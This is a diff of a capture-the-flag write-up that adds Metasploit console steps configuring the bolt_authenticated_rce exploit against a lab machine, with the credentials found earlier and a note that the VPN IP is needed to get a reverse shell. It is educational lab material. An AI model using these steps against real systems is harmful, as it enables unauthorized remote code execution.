@@ -111,6 +111,17 @@ bolt@10.10.189.54's password:
 ![Screenshot from 2024-07-22 12-14-40](https://github.com/user-attachments/assets/e1aab280-997b-4865-8cca-2f8a3e53eb16)
 
 ### Set the options LHOST, RHOSTS, USERNAME, PASSWORD and ran the exploit
+<pre>
+msf6 exploit(unix/webapp/bolt_authenticated_rce) > set LHOST tun0
+LHOST => 10.17.9.110
+msf6 exploit(unix/webapp/bolt_authenticated_rce) > set RHOSTS 10.10.189.54
+RHOSTS => 10.10.189.54
+msf6 exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt
+USERNAME => bolt
+msf6 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123 
+PASSWORD => boltadmin123
+msf6 exploit(unix/webapp/bolt_authenticated_rce) > show options
+</pre>
 #### RHOST is the ip of the machine
 #### LHOST is the ip of our machine’s vpn ( note: we don’t get reverse shell if we use our own ip )
 #### USERNAME and PASSWORD is that we found in previous enumeration
